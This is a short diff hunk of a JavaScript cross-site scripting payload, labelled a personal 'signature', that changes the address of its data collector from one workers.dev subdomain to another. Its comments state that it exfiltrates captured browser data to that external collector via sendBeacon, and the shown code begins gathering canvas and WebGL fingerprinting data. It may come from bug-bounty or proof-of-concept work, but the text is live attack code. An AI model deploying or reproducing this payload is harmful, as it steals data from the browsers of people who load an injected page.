@@ -1,7 +1,7 @@
 // WILD XSS — Raman_MG signature. Renders a self-documenting evidence panel (screenshot-ready)
 // and exfiltrates the captured data to a persistent collector via sendBeacon (no CORS, clean console).
 (() => {
-  const COLLECTOR = "https://rmg-collector.ramanmgg1.workers.dev/"; // https://rmg-collector.<sub>.workers.dev/
+  const COLLECTOR = "https://rmg-collector.ramanmgg2.workers.dev/"; // https://rmg-collector.<sub>.workers.dev/
   // ---- collect ----
   const cvs = document.createElement("canvas"),
     gl = cvs.getContext("webgl") || cvs.getContext("experimental-webgl"),
